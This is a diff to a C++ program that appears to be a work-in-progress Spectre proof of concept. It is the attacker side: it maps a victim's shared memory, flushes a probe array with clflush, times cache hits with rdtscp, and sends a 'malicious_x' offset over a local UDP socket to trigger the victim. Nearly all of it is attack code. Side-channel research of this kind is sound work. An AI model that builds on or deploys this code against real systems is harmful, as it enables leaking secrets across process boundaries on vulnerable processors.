@@ -17,6 +17,8 @@
 #include <thread>
 #include <mutex>
 #include <chrono>
+#include <vector>
+#include <bitset>
 
 // C Includes:
 #include <cstdio>
@@ -24,12 +26,14 @@
 #include <cstdint>
 #include <cstring>
 #include <cassert>
-#ifdef _MSC_VER
-#include <intrin.h> /* for rdtsc, rdtscp, clflush */
-#pragma optimize("gt",on)
-#else
 #include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
-#endif
+
+// POSIX C Includes:
+#include <sys/mman.h>  /* for POSIX Shared Memory */
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <unistd.h>
 
 // Local Includes:
 #include "udp-socket.h"
@@ -37,18 +41,29 @@
 
 
 /********************************************************************
-Victim code.
+Attacker globals.
 ********************************************************************/
-uint8_t array2[256 * 512];  // need to rethink placement...
+//void* array1;
+//size_t array1_size;
 
-void* array1;
-size_t array1_size;
 
+/********************************************************************
+Victim shared-memory (mapped into attacker).
+********************************************************************/
+region* sm_ptr;
+const uint8_t* array2;
 
 
 /********************************************************************
 Analysis code
 ********************************************************************/
+/* Default to a cache hit threshold of 80 */
+int cache_hit_threshold = 80; // make me a compile-time constexpr...?
+
+std::vector< std::bitset<256> > measurements;  // timeseries of measurements
+int results[256]; // score / byte
+
+
 #ifdef NOCLFLUSH
 #define CACHE_FLUSH_ITERATIONS 2048
 #define CACHE_FLUSH_STRIDE 4096
@@ -137,7 +152,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x,
     /* Time reads. Order is lightly mixed up to avoid stride prediction */
     for (int i = 0; i < 256; i++) {
       int mix_i = ((i * 167) + 13) & 255;
-      volatile uint8_t* addr = &array2[mix_i * 512];
+      volatile auto* addr = &array2[mix_i * 512];
 
     /*
     Accuratly measure memory access to the current index of the
@@ -214,12 +229,142 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x,
 }
 
 
+inline void flush_array2() {
+#ifndef NOCLFLUSH
+    /* Flush array2[256*(0..255)] from cache */
+    for (int i = 0; i < 256; i++)
+      _mm_clflush( &array2[i*512] ); /* intrinsic for clflush instruction */
+#else
+    /* Flush array2[256*(0..255)] from cache
+       using long SSE instruction several times */
+    for (int j = 0; j < 16; j++)
+      for (int i = 0; i < 256; i++)
+        flush_memory_sse( &array2[i*512] );
+#endif
+}
+
+
+inline void flush_condition() {
+#ifndef NOCLFLUSH
+      _mm_clflush( &array1_size );
+#else
+      /* Alternative to using clflush to flush the CPU cache */
+      /* Read addresses at 4096-byte intervals out of a large array.
+         Do this around 2000 times, or more depending on CPU cache size. */
+      for(int l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l -= CACHE_FLUSH_STRIDE) {
+        junk2 = cache_flush_array[l];
+      }
+#endif
+
+      /* Delay (can also mfence) */
+#ifndef NOMFENCE
+      _mm_mfence();
+#else
+      for (volatile int z = 0; z < 100; z++) {}
+#endif
+}
+
+
+// Just time measurement:
+void measure_sidechannel(size_t iteration) {
+  volatile unsigned int junk = 0;
+
+  /* Time reads. Order is lightly mixed up to avoid stride prediction */
+  for (int i = 0; i < 256; i++) {
+    int mix_i = ((i * 167) + 13) & 255;
+    volatile auto* addr = &array2[mix_i * 512];
+
+  /*
+  Accuratly measure memory access to the current index of the
+  array so we can determine which index was cached by the malicious mispredicted code.
+  - The best way to do this is to use the rdtscp instruction, which measures current
+  processor ticks, and is also serialized.
+  */
+    register uint64_t time1, time2;
+#ifndef NORDTSCP
+    {
+    unsigned int tmp;
+    time1 = __rdtscp(&tmp); /* READ TIMER */
+    junk = *addr; /* MEMORY ACCESS TO TIME */
+    time2 = __rdtscp(&tmp) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+    }
+#else
+  /*
+  The rdtscp instruction was instroduced with the x86-64 extensions.
+  Many older 32-bit processors won't support this, so we need to use
+  the equivalent but non-serialized tdtsc instruction instead.
+  */
+
+#ifndef NOMFENCE
+    /*
+    Since the rdstc instruction isn't serialized, newer processors will try to
+    reorder it, ruining its value as a timing mechanism.
+    To get around this, we use the mfence instruction to introduce a memory
+    barrier and force serialization. mfence is used because it is portable across
+    Intel and AMD.
+    */
+
+    _mm_mfence();
+    time1 = __rdtsc(); /* READ TIMER */
+    _mm_mfence();
+    junk = *addr; /* MEMORY ACCESS TO TIME */
+    _mm_mfence();
+    time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+    _mm_mfence();
+#else
+    /*
+    The mfence instruction was introduced with the SSE2 instruction set, so
+    we have to ifdef it out on pre-SSE2 processors.
+    Luckily, these older processors don't seem to reorder the rdtsc instruction,
+    so not having mfence on older processors is less of an issue.
+    */
+
+    time1 = __rdtsc(); /* READ TIMER */
+    junk = *addr; /* MEMORY ACCESS TO TIME */
+    time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+#endif
+#endif
+    // WHY do we measure, then throw out if mix_i != array[tries%array1_size]?
+///      if (time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
+    if (time2 <= cache_hit_threshold) {
+//      results[mix_i]++; /* cache hit - add +1 to score for this value */
+      measurements[iteration].set(mix_i);
+    }
+  }
+}
+
+
 /********************************************************************
 Helper/Initialization functions.
 ********************************************************************/
 void init_pages() {
-  for (auto i = 0; i < sizeof(array2); i++) {
-    array2[i] = 1; /* write to array2 to initialize pages */
+  constexpr auto SM_HANDLENAME = "spectre-victim_shm";
+  constexpr auto SM_SIZE = sizeof(region);
+  constexpr size_t PAGE_SIZE = 1<<12;  // 4 KB Pages
+
+  // Setup shared memory for array2 (side-channel):
+  int sm_handle = shm_open(SM_HANDLENAME, O_RDONLY, 0);
+  if (sm_handle < 0) {
+    std::cerr << "Error opening shared memory with handle name: "
+              << SM_HANDLENAME << std::endl;
+    exit(EXIT_FAILURE);
+  }
+//  if (ftruncate(sm_handle, SM_SIZE) < 0) {
+//    std::cerr << "Error on allocating shared memory of size: "
+//              << SM_SIZE << std::endl;
+//  }
+  sm_ptr = static_cast<region*>(
+        mmap(NULL, SM_SIZE, PROT_READ, MAP_SHARED, sm_handle, 0) );
+  if (sm_ptr == MAP_FAILED) {
+    std::cerr << "Error mapping shared memory" << std::endl;
+    exit(EXIT_FAILURE);
+  }
+
+  // Read from array2 to ensure mapping of pages:
+  array2 = sm_ptr->array2;
+  volatile uint8_t tmp;
+  for (auto i = 0; i < sizeof(region::array2); i += PAGE_SIZE) {
+    tmp ^= array2[i];
   }
 }
 
@@ -254,32 +399,38 @@ void print_config() {
 UDP socket functions.
 ********************************************************************/
 void send_worker(uint16_t port = 7777) {
-//  uint8_t buf[2048];
+  uint8_t buf[2048];
 
   SocketUDP s;
   assert(s.setRemote("127.0.0.1", port));
-
   std::cout << "["<<port<<"] - Sender worker thread listening." << std::endl;
+  measurements.reserve(1<<20); // Reserve 1 MB of measurements
 
   msg m = {};
   m.x = 450; // new relative byte offset
 
+  size_t tries = 0;
   for (;;) {
     std::string in;
     std::cout << "Ready to send?" << std::endl;
     std::cin >> in;
 
-    auto bytes = s.send(&m, sizeof(m));
-    if (bytes > 0) {
-      std::cout << "["<<port<<"]- Sent msg of " << bytes << " bytes." << std::endl;
-    }
-    else {
-      std::cout << "["<<port<<"]- Something went wrong on send..." << std::endl;
-      return;
+    // Repeat 100 times:
+    while (++tries % 100 != 0) {
+      flush_array2(); // This does not flush victim's array...
+      auto bytes = s.send(&m, sizeof(m));
+      if (bytes > 0) {
+        bytes = s.recv(buf, sizeof(buf));
+        measure_sidechannel(tries);
+        std::cout << "["<<port<<"]- Measured " << measurements[tries].count() << " hits." << std::endl;
+      }
+      else {
+        std::cout << "["<<port<<"]- Something went wrong on send..." << std::endl;
+        break;
+      }
     }
   }
 }
-
 
 
 /********************************************************************
@@ -294,9 +445,6 @@ int main(int argc, const char *argv[]) {
   // Initialization:
   print_config();
   init_pages();
-
-  /* Default to a cache hit threshold of 80 */
-  int cache_hit_threshold = 80;
 
   // FIXME:
 ///  size_t malicious_x = (size_t)(secret - (char *)array1);
@@ -333,7 +481,19 @@ int main(int argc, const char *argv[]) {
   uint8_t value[2];
 
   printf("Reading at malicious_x = %p...\n", (void * ) malicious_x);
+
+  // Create a cpu_set_t object representing a set of CPUs. Clear it and mark
+  // only CPU i as set.
+  cpu_set_t cpuset;
+  CPU_ZERO(&cpuset);
+  CPU_SET(1, &cpuset);
+
   std::thread t(send_worker, 7777);
+  int rc = pthread_setaffinity_np(t.native_handle(), sizeof(cpuset), &cpuset);
+  if (rc != 0) {
+    std::cerr << "Error calling pthread_setaffinity_np: " << rc << "\n";
+  }
+
   t.join(); // wait until exits for now...
 
   /* Start the read loop to read each address */
